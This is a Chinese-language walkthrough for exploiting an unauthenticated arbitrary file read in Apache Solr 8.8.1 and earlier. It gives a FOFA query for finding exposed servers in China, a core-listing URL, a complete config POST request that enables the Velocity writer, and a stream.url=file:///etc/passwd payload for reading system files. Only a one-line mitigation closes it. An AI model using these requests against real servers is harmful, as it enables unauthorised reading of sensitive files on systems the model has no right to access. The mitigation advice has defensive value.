Apache Solr简介


    Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。它是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果




漏洞描述


    Apache Solr存在任意文件读取漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件


漏洞影响


    Apache Solr <= 8.8.1


漏洞复现


 1）利用fofa语句进行搜索

app="apache-Solr" && country="CN"

2）访问目标 Solr Admin 管理员页面如下

3）获取 core 的信息(能获取到所有内核名称,但主要是获取name所对应的core name，下面url中的core name都需要替换成你这一步所获得的core name)

http://you-ip/solr/admin/cores?indexInfo=false&wt=json

4）发送数据验证漏洞是否存在，通过以下API启用配置

API端点为/solr/[core name]/config

POST /solr/[core name]/config HTTP/1.1Host: yout-ip:8983Content-Type: application/jsonContent-Length: 259
{  "update-queryresponsewriter": {    "startup": "lazy",    "name": "velocity",    "class": "solr.VelocityResponseWriter",    "template.base.dir": "",    "solr.resource.loader.enabled": "true",    "params.resource.loader.enabled": "true"  }}

如果返回内容为 This response format is experimental. It is likely to change in the future 则很有可能存在任意文件读取漏洞，但还是需要进一步去读取文件进行最终确认。

5）接下来访问下面的url

http://you-ip/solr/[core name]/debug/dump?param=ContentStreams

6）刷新bp拦截抓包，把GET转换为POST  发送如下内容 

stream.url=file:///etc/passwd   //知道路径可以读取任意文件

成功读取passwd文件（linux），存在任意文件读取漏洞。

如果是windows

stream.url=file:///c:\     //只要知道路径即可读取

7）利用EXP(自己写了个，不好用)

github EXP参考链接https://github.com/search?q=Apache-Solr+%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96

8）修复建议

由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动。若需要在公网中使用，需要限制访问ip。
